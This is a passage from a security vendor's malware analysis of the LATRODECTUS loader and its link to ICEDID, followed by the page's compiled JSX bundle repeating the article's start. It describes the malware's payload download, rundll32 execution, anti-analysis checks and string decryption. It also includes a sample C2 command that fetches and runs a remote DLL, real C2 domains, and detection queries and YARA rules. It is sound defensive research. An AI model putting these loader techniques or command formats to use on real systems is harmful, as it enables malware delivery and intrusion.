directory. These file paths and filenames are seeded by a custom random number generator which we will review in the next section. In our case, this new folder location is: \n\n```\nC:\\Users\\REM\\AppData\\Roaming\\-632116337\n```\n\nIt retrieves a file (```test.dll```) from the C2 server, the standard ICEDID loader, which is written to disk with a randomly -generated file name (```-456638727.dll```).\n\n![LATRODECTUS downloading ICEDID loader](/assets/images/spring-cleaning-with-latrodectus/image9.png)\n\n\nLATRODECTUS will then perform similar steps by generating a random filename for the ICEDID payload (```1431684209.dat```). Before performing the download, it will set-up the arguments to properly load ICEDID. If you have run into ICEDID in the past, this part of the command-line should look familiar: it’s used to call the ICEDID export of the loader, while passing the relative path to the encrypted ICEDID payload file.\n\n```\ninit -zzzz=\"-632116337\\1431684209.dat\"\n```\n\n![LATRODECTUS downloading ICEDID data](/assets/images/spring-cleaning-with-latrodectus/image20.png)\n\n\nLATRODECUS initiates a second download request using a hard-coded URI (```/files/bp.dat```) from the configured C2 server, which is written to a file (```1431684209.dat```). Analyzing the ```bp.dat``` file, researchers identified it as a conventional encrypted ICEDID payload, commonly referenced as ```license.dat```.\n\n![Encrypted ICEDID payload (```bp.dat```)](/assets/images/spring-cleaning-with-latrodectus/image31.png)\n\n\nAfter decrypting the file, malware researchers noted a familiar 129 byte sequence of junk bytes prepended to the file followed by the custom section headers. \n\n![Decrypted ICEDID payload (```bp.dat```)](/assets/images/spring-cleaning-with-latrodectus/image43.png)\n\n\nOur team was able to revisit [prior tooling](https://www.elastic.co/security-labs/unpacking-icedid) and successfully decrypt this file, enabling us to rebuild the PE (ICEDID).\n\n![ICEDID YARA triggering on rebuilt PE from ```bp.dat```](/assets/images/spring-cleaning-with-latrodectus/image28.png)\n\n\nAt this point, the ICEDID loader and encrypted payload have been downloaded to the same folder.\n\n![](/assets/images/spring-cleaning-with-latrodectus/image38.png)\n\nThese files are then executed together using ```rundll32.exe``` via **CreateProcessW** with their respective arguments. Below is the observed command-line:\n\n```\nrundll32.exe C:\\Users\\REM\\AppData\\Roaming\\-632116337\\-456638727.dll,init -zzzz=\"-632116337\\1431684209.dat\"\n```\n\n![```Rundll32.exe``` execution](/assets/images/spring-cleaning-with-latrodectus/image18.png)\n\n\nScanning the ```rundll32.exe``` child process spawned by LATRODECTUS with our ICEDID YARA rule also indicates the presence of the ICEDID. \n\n![YARA memory scan detecting ICEDID](/assets/images/spring-cleaning-with-latrodectus/image41.png)\n\n\n#### Beacon timeout - command ID (19)\n\nLATRODECTUS supports jitter for beaconing to C2. This can make it harder for defenders to detect via network sources due to randomness this introduces to beaconing intervals.\n\n![Adjust timeout feature (Handler #19)](/assets/images/spring-cleaning-with-latrodectus/image45.png)\n\n\nIn order to calculate the timeout, it generates a random number by seeding a combination of the user’s cursor position on the screen multiplied by the system’s uptime (```GetTickCount```). This result is passed as a parameter to **RtlRandomEx**. \n\n![Random number generator using cursor position](/assets/images/spring-cleaning-with-latrodectus/image22.png)\n\n\n#### Reset counter - command ID (20)\n\nThis command handler will reset the request counter that is passed on each communication request. For example, on the third callback it is filled with 3 here. With this function, the developer can reset the count starting from 0.\n\n```\ncounter=3\u0026type=4\u0026guid=638507385\n```\n\n### LATRODECTUS / ICEDID connection\n\nThere definitely is some kind of development connection or working arrangement between ICEDID and LATRODECTUS. Below are some of the similarities observed:\n - Same enumeration commands in the system discovery handler\n - The DLL exports all point to same export function address, this was a common observation with ICEDID payloads\n - C2 data is concatenated together as variables in the C2 traffic requests\n - The ```bp.dat``` file downloaded from handler (#18) is used to execute the ICEDID payload via ```rundll32.exe``` \n - The functions appear to be similarly coded\n\n![COM-based Scheduled Task setup - ICEDID vs LATRODECTUS](/assets/images/spring-cleaning-with-latrodectus/image13.png)\n\n\nResearchers didn’t conclude that there was a clear relationship between the ICEDID and LATRODECTUS families, though they appear at least superficially affiliated. ICEDID possesses more mature capabilities, like those used for data theft or the [BackConnect](https://www.team-cymru.com/post/inside-the-icedid-backconnect-protocol) module, and has been richly documented over a period of several years. One hypothesis being considered is that LATRODECTUS is being actively developed as a replacement for ICEDID, and the handler (#18) was included until malware authors were satisfied with LATRODECTUS’ capabilities.\n\n### Sandboxing LATRODECTUS\n\nTo evaluate LATRODECTUS detections, we set up a Flask server configured with the different handlers to instruct an infected machine to perform various actions in a sandbox environment. This method provides defenders with a great opportunity to assess the effectiveness of their detection and logging tools against every capability. Different payloads like shellcode/binaries can be exchanged as needed.\n\n![Command handlers sandboxed](/assets/images/spring-cleaning-with-latrodectus/image42.png)\n\n\nAs an example, for the download and execution of a DLL (handler #13), we can provide the following request structure (object type, handler, arguments for handler) to the command dispatcher:\n\n```\nCOMMAND|13|http://www.meow123.com/dll, ShowMessage\n```\n\nThe following example depicts the RC4-encrypted string described earlier, which has been base64-encoded.\n\n```\nE3p1L21QSBOqEKjYrBKiLNZJTk7KZn+HWn0p2LQfOLWCz/py4VkkAxSXXdnDd39p2EU=\n```\n\nUsing the following CyberChef recipe, analysts can generate encrypted command requests:\n\n![Example with DLL Execution handler via CyberChef](/assets/images/spring-cleaning-with-latrodectus/image1.png)\n\n\nUsing the actual malware codebase and executing these different handlers using a low-risk framework, defenders can get a glimpse into the events, alerts, and logs recorded by their security instrumentation. \n\n## Detecting LATRODECTUS\n\nThe following Elastic Defend protection features trigger during the LATRODECTUS malware infection process: \n\n![Elastic Defend alerts against LATRODECTUS](/assets/images/spring-cleaning-with-latrodectus/image5.png)\n\n\nBelow are the prebuilt MITRE ATT\u0026CK-aligned rules with descriptions:\n\n| ATT\u0026CK technique | Elastic Rule | Description |\n| ----- | ----- | ----- |\n| [T1059.007 - Javascript](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/execution_oversized_windows_script_execution.toml) [T1027 - Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027/) | [Suspicious Oversized Script Execution](https://github.com/elastic/protections-artifacts/blob/72bede645f2fbb34cf3882fa2758c896a0073c6b/behavior/rules/execution_oversized_windows_script_execution.toml) | LATRODECTUS is delivered via oversized Javascript files, on average more than 800KB filled with random text. |\n| [T1047 - Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047/) | [Execution via a Suspicious WMI Client](https://github.com/elastic/protections-artifacts/blob/72bede645f2fbb34cf3882fa2758c896a0073c6b/behavior/rules/initial_access_execution_via_a_suspicious_wmi_client.toml) | Javascript dropper invokes WMI to mount a WEBDAV share and invokes msiexec to install a remote msi file. |\n| [T1218.007 - Misexec](https://attack.mitre.org/techniques/T1218/007/) | [Remote File Execution via MSIEXEC](https://github.com/elastic/protections-artifacts/blob/72bede645f2fbb34cf3882fa2758c896a0073c6b/behavior/rules/defense_evasion_remote_file_execution_via_msiexec.toml) [Suspicious MsiExec Child Process](https://github.com/elastic/protections-artifacts/blob/72bede645f2fbb34cf3882fa2758c896a0073c6b/behavior/rules/defense_evasion_suspicious_msiexec_child_process.toml) | MSI file hosted on remote Webdav and executed in quiet mode. Once executed it drops a DLL and launches rundll32 to load it via the Advanced installer viewer.exe binary. |\n| [T1218.011 - Rundll32](https://attack.mitre.org/techniques/T1218/011/) | [Rundll32 or Regsvr32 Loaded a DLL from Unbacked Memory](https://github.com/elastic/protections-artifacts/blob/72bede645f2fbb34cf3882fa2758c896a0073c6b/behavior/rules/defense_evasion_rundll32_or_regsvr32_loaded_a_dll_from_unbacked_memory.toml) | Rundll32 loads the LATRODECTUS DLL from AppData and starts code injection. |\n| [T1055 - Process Injection](https://attack.mitre.org/techniques/T1055/) | [Memory Threat Detection Alert: Shellcode Injection](https://www.elastic.co/guide/en/security/current/configure-endpoint-integration-policy.html#memory-protection) [VirtualProtect API Call from an Unsigned DLL](https://github.com/elastic/protections-artifacts/blob/72bede645f2fbb34cf3882fa2758c896a0073c6b/behavior/rules/defense_evasion_virtualprotect_api_call_from_an_unsigned_dll.toml) [Shellcode Execution from Low Reputation Module](https://github.com/elastic/protections-artifacts/blob/72bede645f2fbb34cf3882fa2758c896a0073c6b/behavior/rules/defense_evasion_shellcode_execution_from_low_reputation_module.toml) [Network Module Loaded from Suspicious Unbacked Memory](https://github.com/elastic/protections-artifacts/blob/72bede645f2fbb34cf3882fa2758c896a0073c6b/behavior/rules/defense_evasion_network_module_loaded_from_suspicious_unbacked_memory.toml) | Shellcode execution triggers 3 endpoint behavior alerts and a memory threat detection alert. |\n| [T1053.005 - Scheduled Task](https://attack.mitre.org/techniques/T1053/005/) | [Scheduled Task Creation by an Unusual Process](https://github.com/elastic/protections-artifacts/blob/72bede645f2fbb34cf3882fa2758c896a0073c6b/behavior/rules/persistence_scheduled_task_creation_by_an_unusual_process.toml) | LATRODECTUS may persist using scheduled tasks (rundll32 will create a scheduled task). |\n| [T1070.004 - File Deletion](https://attack.mitre.org/techniques/T1070/004/) | [Potential Self Deletion of a Running Executable](https://github.com/elastic/protections-artifacts/blob/72bede645f2fbb34cf3882fa2758c896a0073c6b/behavior/rules/defense_evasion_potential_self_deletion_of_a_running_executable.toml) | Part of the malware DLL self update command and also when the DLL is not running from AppData, LATRODECTUS will delete itself while running and restart from the new path or running an updated version of itself leveraging [this technique](https://github.com/LloydLabs/delete-self-poc). |\n| [T1059.003 - Windows Command Shell](https://attack.mitre.org/techniques/T1059/003/) | [Command Shell Activity Started via RunDLL32](https://github.com/elastic/protections-artifacts/blob/72bede645f2fbb34cf3882fa2758c896a0073c6b/behavior/rules/execution_command_shell_activity_started_via_rundll32.toml) | LATRODECTUS Command ID (4) - Collect system information via a series of cmd.exe execution. |\n\nThe following list of hunts and detection queries can be used to detect LATRODECTUS post-exploitation commands focused on execution:\n\n**Rundll32 Download PE/DLL** (command handlers #12, #13 and #18): \n\n``` sql\nsequence by process.entity_id with maxspan=1s\n[file where event.action == \"creation\" and process.name : \"rundll32.exe\" and \n /* PE file header dropped to the InetCache folder */\nfile.Ext.header_bytes : \"4d5a*\" and file.path : \"?:\\\\Users\\\\*\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\INetCache\\\\IE\\\\*\"]\n[network where process.name : \"rundll32.exe\" and \n   event.action : (\"disconnect_received\", \"connection_attempted\") and \n   /* network disconnect activity to a public Ip address */\n   not cidrmatch(destination.ip, \"10.0.0.0/8\", \"127.0.0.0/8\", \"169.254.0.0/16\", \"172.16.0.0/12\", \"192.0.0.0/24\", \"192.0.0.0/29\", \"192.0.0.8/32\", \"192.0.0.9/32\", \"192.0.0.10/32\", \"192.0.0.170/32\", \"192.0.0.171/32\", \"192.0.2.0/24\", \"192.31.196.0/24\", \"192.52.193.0/24\", \"192.88.99.0/24\", \"224.0.0.0/4\", \"100.64.0.0/10\", \"192.175.48.0/24\",\"198.18.0.0/15\", \"198.51.100.0/24\", \"203.0.113.0/24\", \"240.0.0.0/4\", \"::1\", \"FE80::/10\", \"FF00::/8\", \"192.168.0.0/16\")]\n```\n\n![EQL Query using hunt detecting LATRODECTUS](/assets/images/spring-cleaning-with-latrodectus/image8.png)\n\n\nBelow is an ES|QL hunt to look for long-term and/or high count of network connections by rundll32 to a public IP address (which is uncommon): \n\n``` sql\nfrom logs-endpoint.events.network-*\n| where host.os.family == \"windows\" and event.category == \"network\" and\n network.direction == \"egress\" and process.name == \"rundll32.exe\" and\n/* excluding private IP ranges */\n not CIDR_MATCH(destination.ip, \"10.0.0.0/8\", \"127.0.0.0/8\", \"169.254.0.0/16\", \"172.16.0.0/12\", \"192.0.0.0/24\", \"192.0.0.0/29\", \"192.0.0.8/32\", \"192.0.0.9/32\", \"192.0.0.10/32\", \"192.0.0.170/32\", \"192.0.0.171/32\", \"192.0.2.0/24\", \"192.31.196.0/24\", \"192.52.193.0/24\", \"192.168.0.0/16\", \"192.88.99.0/24\", \"224.0.0.0/4\", \"100.64.0.0/10\", \"192.175.48.0/24\",\"198.18.0.0/15\", \"198.51.100.0/24\", \"203.0.113.0/24\", \"240.0.0.0/4\", \"::1\",\"FE80::/10\", \"FF00::/8\")\n| keep source.bytes, destination.address, process.name, process.entity_id, process.pid, @timestamp, host.name\n/* calc total duration and the number of connections per hour */\n| stats count_connections = count(*), start_time = min(@timestamp), end_time = max(@timestamp) by process.entity_id, process.pid, destination.address, process.name, host.name\n| eval duration = TO_DOUBLE(end_time)-TO_DOUBLE(start_time), duration_hours=TO_INT(duration/3600000), number_of_con_per_hour = (count_connections / duration_hours)\n| keep host.name, destination.address, process.name, process.pid, duration, duration_hours, number_of_con_per_hour, count_connections\n| where count_connections \u003e= 100\n```\n\n![ES|QL Query using hunt detecting LATRODECTUS](/assets/images/spring-cleaning-with-latrodectus/image3.png)\n\n\nBelow is a screenshot of Elastic Defend triggering on the LATRODECTUS [memory signature](https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows_Trojan_Latrodectus.yar):   \n\n![Memory signatures against LATRODECTUS via Elastic Defend](/assets/images/spring-cleaning-with-latrodectus/image23.png)\n\n\n### YARA\n\nElastic Security has created YARA rules to identify [LATRODECTUS](https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows_Trojan_Latrodectus.yar):\n\n```\nrule Windows_Trojan_LATRODECTUS_841ff697 {\n    meta:\n        author = \"Elastic Security\"\n        creation_date = \"2024-03-13\"\n        last_modified = \"2024-04-05\"\n        license = \"Elastic License v2\"\n         os = \"Windows\"\n        arch = \"x86\"\n        threat_name = \"Windows.Trojan.LATRODECTUS\"\n        reference_sample = \"aee22a35cbdac3f16c3ed742c0b1bfe9739a13469cf43b36fb2c63565111028c\"\n\n\n    strings:\n        $Str1 = { 48 83 EC 38 C6 44 24 20 73 C6 44 24 21 63 C6 44 24 22 75 C6 44 24 23 62 C6 44 24 24 }\n        $crc32_loadlibrary = { 48 89 44 24 40 EB 02 EB 90 48 8B 4C 24 20 E8 ?? ?? FF FF 48 8B 44 24 40 48 81 C4 E8 02 00 00 C3 }\n        $delete_self = { 44 24 68 BA 03 00 00 00 48 8B 4C 24 48 FF 15 ED D1 00 00 85 C0 75 14 48 8B 4C 24 50 E8 ?? ?? 00 00 B8 FF FF FF FF E9 A6 00 }\n        $Str4 = { 89 44 24 44 EB 1F C7 44 24 20 00 00 00 00 45 33 C9 45 33 C0 33 D2 48 8B 4C 24 48 FF 15 7E BB 00 00 89 44 24 44 83 7C 24 44 00 75 02 EB 11 48 8B 44 24 48 EB 0C 33 C0 85 C0 0F 85 10 FE FF FF 33 }\n        $handler_check = { 83 BC 24 D8 01 00 00 12 74 36 83 BC 24 D8 01 00 00 0E 74 2C 83 BC 24 D8 01 00 00 0C 74 22 83 BC 24 D8 01 00 00 0D 74 18 83 BC 24 D8 01 00 00 0F 74 0E 83 BC 24 D8 01 00 00 04 0F 85 44 02 00 00 }\n        $hwid_calc = { 48 89 4C 24 08 48 8B 44 24 08 69 00 0D 66 19 00 48 8B 4C 24 08 89 01 48 8B 44 24 08 8B 00 C3 }\n        $string_decrypt = { 89 44 24 ?? 48 8B 44 24 ?? 0F B7 40 ?? 8B 4C 24 ?? 33 C8 8B C1 66 89 44 24 ?? 48 8B 44 24 ?? 48 83 C0 ?? 48 89 44 24 ?? 33 C0 66 89 44 24 ?? EB ?? }\n        $campaign_fnv = { 48 03 C8 48 8B C1 48 39 44 24 08 73 1E 48 8B 44 24 08 0F BE 00 8B 0C 24 33 C8 8B C1 89 04 24 69 04 24 93 01 00 01 89 04 24 EB BE }\n    condition:\n        2 of them\n}\n```\n\n## Observations\n\nThe following observables were discussed in this research.\n\n| Observable | Type | Name | Reference |\n| --- | --- | --- | --- |\n| aee22a35cbdac3f16c3ed742c0b1bfe9739a13469cf43b36fb2c63565111028c | SHA-256 | TRUFOS.DLL | LATRODECTUS |\n| aytobusesre.com | domain | | LATRODECTUS C2 |\n| scifimond.com | domain | | LATRODECTUS C2 |\n| gyxplonto.com | domain | | ICEDID C2 |\n| neaachar.com | domain | | ICEDID C2 |\n\n## References\nThe following were referenced throughout the above research:\n\n - [https://medium.com/walmartglobaltech/icedid-gets-loaded-af073b7b6d39](https://medium.com/walmartglobaltech/icedid-gets-loaded-af073b7b6d39)\n - [https://www.proofpoint.com/us/blog/threat-insight/latrodectus-spider-bytes-ice](https://www.proofpoint.com/us/blog/threat-insight/latrodectus-spider-bytes-ice)\n\n## Tooling\n[String decryption and IDA commenting tool](https://github.com/elastic/labs-releases/blob/main/tools/latrodectus/latro_str_decrypt.py)\n","code":"var Component=(()=\u003e{var h=Object.create;var a=Object.defineProperty;var m=Object.getOwnPropertyDescriptor;var p=Object.getOwnPropertyNames;var g=Object.getPrototypeOf,u=Object.prototype.hasOwnProperty;var f=(i,e)=\u003e()=\u003e(e||i((e={exports:{}}).exports,e),e.exports),w=(i,e)=\u003e{for(var t in e)a(i,t,{get:e[t],enumerable:!0})},d=(i,e,t,s)=\u003e{if(e\u0026\u0026typeof e==\"object\"||typeof e==\"function\")for(let r of p(e))!u.call(i,r)\u0026\u0026r!==t\u0026\u0026a(i,r,{get:()=\u003ee[r],enumerable:!(s=m(e,r))||s.enumerable});return i};var b=(i,e,t)=\u003e(t=i!=null?h(g(i)):{},d(e||!i||!i.__esModule?a(t,\"default\",{value:i,enumerable:!0}):t,i)),y=i=\u003ed(a({},\"__esModule\",{value:!0}),i);var l=f((_,o)=\u003e{o.exports=_jsx_runtime});var v={};w(v,{default:()=\u003eT,frontmatter:()=\u003eD});var n=b(l()),D={title:\"Spring Cleaning with LATRODECTUS: A Potential Replacement for ICEDID\",slug:\"spring-cleaning-with-latrodectus\",date:\"2024-05-16\",subtitle:\"The LATRODECTUS loader evolves to deliver ICEDID and other malware\",description:\"Elastic Security Labs has observed an uptick in a recent emerging loader known as LATRODECTUS. This lightweight loader packs a big punch with ties to ICEDID and may turn into a possible replacement to fill the gap in the loader market.\",author:[{slug:\"daniel-stepanic\"},{slug:\"samir-bousseaden\"}],image:\"Security Labs Images 16.jpg\",category:[{slug:\"malware-analysis\"}],tags:[\"icedid\",\"latrodectus\",\"loader\"]};function c(i){let e=Object.assign({h2:\"h2\",p:\"p\",a:\"a\",h3:\"h3\",ul:\"ul\",li:\"li\",img:\"img\",pre:\"pre\",code:\"code\",div:\"div\",table:\"table\",thead:\"thead\",tr:\"tr\",th:\"th\",tbody:\"tbody\",td:\"td\",strong:\"strong\",h4:\"h4\"},i.components);return(0,n.jsxs)(n.Fragment,{children:[(0,n.jsx)(e.h2,{id:\"latrodectus-at-a-glance\",children:\"LATRODECTUS at a glance\"}),`\n`,(0,n.jsxs)(e.p,{children:[\"First \",(0,n.jsx)(e.a,{href:\"https://medium.com/walmartglobaltech/icedid-gets-loaded-af073b7b6d39\",rel:\"nofollow\",children:\"discovered\"}),\" by Walmart researchers in October of 2023, \",(0,n.jsx)(e.a,{href:\"https://malpedia.caad.fkie.fraunhofer.de/details/win.unidentified_111\",rel:\"nofollow\",children:\"LATRODECTUS\"}),\" is a malware loader gaining popularity among cybercriminals. While this is considered a new family, there is a strong link between LATRODECTUS and \",(0,n.jsx)(e.a,{href:\"https://www.elastic.co/security-labs/thawing-the-permafrost-of-icedid-summary\",rel:\"nofollow\",children:\"ICEDID\"}),\" due to behavioral and developmental similarities, including a command handler that downloads and executes encrypted payloads like ICEDID. Proofpoint and Team Cymru built upon this connection to discover a \",(0,n.jsx)(e.a,{href:\"https://www.proofpoint.com/us/blog/threat-insight/latrodectus-spider-bytes-ice\",rel:\"nofollow\",children:\"strong link\"}),\" between the network infrastructure used by both the operators of ICEDID and LATRODECTUS.\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"LATRODECTUS offers a comprehensive range of standard capabilities that threat actors can utilize to deploy further payloads, conducting various activities after initial compromise. The code base isn\\u2019t obfuscated and contains only 11 command handlers focused on enumeration and execution. This type of loader represents a recent wave observed by our team such as \",(0,n.jsx)(e.a,{href:\"https://www.elastic.co/security-labs/pikabot-i-choose-you\",rel:\"nofollow\",children:\"PIKABOT\"}),\", where the code is more lightweight and direct with a limited number of handlers.\"]}),`\n`,(0,n.jsx)(e.p,{children:\"This article will focus on LATRODECTUS itself, analyzing its most significant features and sharing resources for addressing this financially impactful threat.\"}),`\n`,(0,n.jsx)(e.h3,{id:\"key-takeaways\",children:\"Key takeaways\"}),`\n`,(0,n.jsxs)(e.ul,{children:[`\n`,(0,n.jsx)(e.li,{children:\"Initially discovered by Walmart researchers last year, LATRODECTUS continues to gain adoption among recent financially-motivated campaigns\"}),`\n`,(0,n.jsx)(e.li,{children:\"LATRODECTUS, a possible replacement for ICEDID shares similarity to ICEDID including a command handler to execute ICEDID payloads\"}),`\n`,(0,n.jsx)(e.li,{children:\"We observed new event handlers (process discovery, desktop file listing) since its inception and integration of a self-delete technique to delete running files\"}),`\n`,(0,n.jsx)(e.li,{children:\"Elastic Security provides a high degree of capability through memory signatures, behavioral rules, and hunting opportunities to respond to threats like LATRODECTUS\"}),`\n`]}),`\n`,(0,n.jsx)(e.h3,{id:\"latrodectus-campaign-overview\",children:\"LATRODECTUS campaign overview\"}),`\n`,(0,n.jsx)(e.p,{children:\"Beginning early March of 2024, Elastic Security Labs observed an increase in email campaigns delivering LATRODECTUS. These campaigns typically involve a recognizable infection chain involving oversized JavaScript files that utilize WMI\\u2019s ability to invoke msiexec.exe and install a remotely-hosted MSI file, remotely hosted on a WEBDAV share.\"}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/spring-cleaning-with-latrodectus/image44.png\",alt:\"\",width:\"1107\",height:\"556\"})}),`\n`,(0,n.jsxs)(e.p,{children:[\"With major changes in the loader space during the past year, such as the \",(0,n.jsx)(e.a,{href:\"https://www.elastic.co/security-labs/qbot-malware-analysis\",rel:\"nofollow\",children:\"QBOT\"}),\" takedown and \",(0,n.jsx)(e.a,{href:\"https://www.elastic.co/security-labs/unpacking-icedid\",rel:\"nofollow\",children:\"ICEDID\"}),\" dropping off, we are seeing new loaders such as \",(0,n.jsx)(e.a,{href:\"https://www.elastic.co/security-labs/pikabot-i-choose-you\",rel:\"nofollow\",children:\"PIKABOT\"}),\" and \",(0,n.jsx)(e.a,{href:\"https://malpedia.caad.fkie.fraunhofer.de/details/win.unidentified_111\",rel:\"nofollow\",children:\"LATRODECTUS\"}),\" have emerged as possible replacements.\"]}),`\n`,(0,n.jsx)(e.h2,{id:\"latrodectus-analysis\",children:\"LATRODECTUS analysis\"}),`\n`,(0,n.jsxs)(e.p,{children:[\"Our LATRODECTUS \",(0,n.jsx)(e.a,{href:\"https://www.virustotal.com/gui/file/aee22a35cbdac3f16c3ed742c0b1bfe9739a13469cf43b36fb2c63565111028c/details\",rel:\"nofollow\",children:\"sample\"}),\" comes initially packed with file information \",(0,n.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1036/\",rel:\"nofollow\",children:\"masquerading\"}),\" as a component to Bitdefender\\u2019s kernel-mode driver (TRUFOS.SYS), shown in the following image.\"]}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/spring-cleaning-with-latrodectus/image47.png\",alt:\"File version information of packed LATRODECTUS sample\",width:\"543\",height:\"203\"})}),`\n`,(0,n.jsxs)(e.p,{children:[\"In order to move forward with malware analysis, the sample must be unpacked manually or via an automatic unpacking service such as \",(0,n.jsx)(e.a,{href:\"http://Unpac.Me\",rel:\"nofollow\",children:\"UnpacMe\"}),\".\"]}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/spring-cleaning-with-latrodectus/image26.png\",alt:\"UnpacMe summary\",width:\"1320\",height:\"711\"})}),`\n`,(0,n.jsx)(e.p,{children:\"LATRODECTUS is a DLL with 4 different exports, and each export is assigned the same export address.\"}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/spring-cleaning-with-latrodectus/image21.png\",alt:\"Exports for LATRODECTUS\",width:\"774\",height:\"188\"})}),`\n`,(0,n.jsx)(e.h3,{id:\"string-obfuscation\",children:\"String obfuscation\"}),`\n`,(0,n.jsxs)(e.p,{children:[\"All of the strings within LATRODECTUS are protected using a straightforward algorithm on the encrypted bytes and applying a transformation by performing arithmetic and bitwise operations. The initial \",(0,n.jsx)(e.a,{href:\"https://medium.com/walmartglobaltech/icedid-gets-loaded-af073b7b6d39\",rel:\"nofollow\",children:\"report\"}),\" published in 2023 detailed a PRNG algorithm that was not observed in our sample, suggesting continuous development of this loader. Below is the algorithm implemented in Python using our \",(0,n.jsx)(e.a,{href:\"https://github.com/elastic/labs-releases/tree/main/nightMARE\",rel:\"nofollow\",children:\"nightMARE framework\"}),\":\"]}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{className:\"language-python\",children:`def decrypt_string(encrypted_bytes: bytes) -\u003e bytes:\n    x = cast.u32(encrypted_bytes[:4])\n    y = cast.u16(encrypted_bytes[4:6])\n    byte_size = cast.u16(cast.p32(x ^ y)[:2])\n    decoded_bytes = bytearray(byte_size)\n\n    for i, b in enumerate(encrypted_bytes[6 : 6 + byte_size]):\n        decoded_bytes[i] = ((x + i + 1) ^ b) % 256\n\n    return bytes(decoded_bytes)\n`})}),`\n`,(0,n.jsx)(e.h3,{id:\"runtime-api\",children:\"Runtime API\"}),`\n`,(0,n.jsxs)(e.p,{children:[\"LATRODECTUS obfuscates the majority of its imports until runtime. At the start of the program, it queries the PEB in combination with using a CRC32 checksum to resolve \",(0,n.jsx)(e.code,{children:\"kernel32.dll\"}),\" and \",(0,n.jsx)(e.code,{children:\"ntdll.dll\"}),\" modules and their functions. In order to resolve additional libraries such as \",(0,n.jsx)(e.code,{children:\"user32.dll\"}),\" or \",(0,n.jsx)(e.code,{children:\"wininet.dll\"}),\", the malware takes a different approach performing a wildcard search (\",(0,n.jsx)(e.code,{children:\"*.dll\"}),\") in the Windows system directory. It retrieves each DLL filename and passes them directly to a CRC32 checksum function.\"]}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/spring-cleaning-with-latrodectus/image15.png\",alt:\"DLL search using a CRC32 checksum\",width:\"612\",height:\"483\"})}),`\n`,(0,n.jsx)(e.h3,{id:\"anti-analysis\",children:\"Anti-analysis\"}),`\n`,(0,n.jsx)(e.p,{children:\"When all the imports are resolved, LATRODECTUS performs several serial anti-analysis checks. The first monitors for a debugger by looking for the BeingDebugged flag inside the Process Environment Block (PEB). If a debugger is identified, the program terminates.\"}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/spring-cleaning-with-latrodectus/image35.png\",alt:\"BeingDebugged check via PEB\",width:\"313\",height:\"76\"})}),`\n`,(0,n.jsx)(e.p,{children:\"In order to avoid sandboxes or virtual machines that may have a low number of active processes, two validation checks are used to combine the number of running processes with the OS product version.\"}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/spring-cleaning-with-latrodectus/image30.png\",alt:\"Number of processes and OS validation checks\",width:\"599\",height:\"98\"})}),`\n`,(0,n.jsx)(e.p,{children:\"In order to account for the major differences between Windows OS versions, the developer uses a custom enum based on the major/minor version, and build numbers within Windows.\"}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/spring-cleaning-with-latrodectus/image4.png\",alt:\"Enum related to build numbers, OS version\",width:\"876\",height:\"601\"})}),`\n`,(0,n.jsx)(e.p,{children:\"The two previous conditions translate to:\"}),`\n`,(0,n.jsxs)(e.ul,{children:[`\n`,(0,n.jsx)(e.li,{children:\"LATRODECTUS will exit if the number of processes is less than 75 and the OS version is a recent build such as Windows 10, Windows Server 2016, or Windows 11\"}),`\n`,(0,n.jsx)(e.li,{children:\"LATRODECTUS will exit if the number of processes is less than 50 and the OS version is an older build such as Windows Server 2003 R2, Windows XP, Windows 2000, Windows 7, Windows 8, or Windows Server 2012/R2\"}),`\n`]}),`\n`,(0,n.jsx)(e.p,{children:\"After the sandbox check, LATRODECTUS verifies if the current process is running under WOW64, a subsystem of Windows operating systems that allows for 32-bit applications to run on 64-bit systems. If true (running as a 32-bit application on a 64-bit OS), the malware will exit.\"}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/spring-cleaning-with-latrodectus/image27.png\",alt:\"IsWow64Process check\",width:\"431\",height:\"83\"})}),`\n`,(0,n.jsxs)(e.p,{children:[\"The last check is based on verifying the MAC address via the \",(0,n.jsx)(e.code,{children:\"GetAdaptersInfo()\"}),\" call from \",(0,n.jsx)(e.code,{children:\"iphlpapi.dll\"}),\". If there is no valid MAC Address, the malware will also terminate.\"]}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/spring-cleaning-with-latrodectus/image36.png\",alt:\"MAC Address check\",width:\"540\",height:\"279\"})}),`\n`,(0,n.jsx)(e.h3,{id:\"mutex\",children:\"Mutex\"}),`\n`,(0,n.jsxs)(e.p,{children:[\"This malware uses the string \",(0,n.jsx)(e.code,{children:\"runnung\"}),\" as the mutex to prevent re-infection on the host, which may be an accidental typo on the part of developers.\"]}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/spring-cleaning-with-latrodectus/image29.png\",alt:\"Mutex\",width:\"727\",height:\"124\"})}),`\n`,(0,n.jsx)(e.h3,{id:\"hardware-id\",children:\"Hardware ID\"}),`\n`,(0,n.jsxs)(e.p,{children:[\"After the mutex creation, LATRODECTUS will generate a hardware ID that is seeded from the volume serial number of the machine in combination with multiplying a hard-coded constant (\",(0,n.jsx)(e.code,{children:\"0x19660D\"}),\").\"]}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/spring-cleaning-with-latrodectus/image6.png\",alt:\"HWID calculation\",width:\"670\",height:\"200\"})}),`\n`,(0,n.jsx)(e.h3,{id:\"campaign-id\",children:\"Campaign 